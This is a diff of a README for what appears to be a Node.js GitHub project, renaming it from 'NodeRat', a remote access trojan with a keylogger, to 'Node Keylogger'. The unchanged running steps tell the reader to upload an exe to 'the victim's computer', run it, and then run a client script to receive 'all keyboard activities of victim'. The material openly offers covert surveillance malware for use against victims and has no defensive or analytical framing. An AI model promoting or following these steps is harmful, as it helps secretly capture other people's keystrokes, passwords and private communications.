@@ -1,8 +1,8 @@
 
-# 👾 NodeRat
-**NodeRat is a RAT program includes keylogger**
+# 👾 Node Keylogger
+**Node Keylogger is a keylogger program**
 
-![.](https://github.com/Noirrs/NodeRat/blob/main/assets/hierarchy.png)
+![.](https://github.com/Noirrs/node-keylogger/blob/main/assets/hierarchy.png)
 
  
 ## 👟 Running
@@ -13,7 +13,7 @@
 * Upload the exe file to the victim's computer and run it (double click)
 * Run client.js file on your own computer `npm run client`
 
-   **Now RAT system is on, you can get all keyboard activities of victim**
+   **Now Keylogger system is on, you can get all keyboard activities of victim**
 
 ## 🦾 Used technologies
 
